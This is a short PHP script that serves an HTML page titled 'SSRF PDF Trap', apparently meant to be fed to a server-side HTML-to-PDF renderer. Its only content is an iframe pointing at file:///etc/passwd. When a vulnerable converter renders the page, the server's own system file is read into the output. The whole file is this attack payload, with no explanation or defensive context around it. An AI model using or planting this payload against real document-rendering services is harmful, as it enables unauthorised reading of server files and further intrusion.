<?php
header("Content-Type: text/html");

echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>SSRF PDF Trap</title>
</head>
<body>
    <h1>Try reading local file</h1>
    <iframe src="file:///etc/passwd" width="100%" height="800"></iframe>
</body>
</html>
HTML;
?>
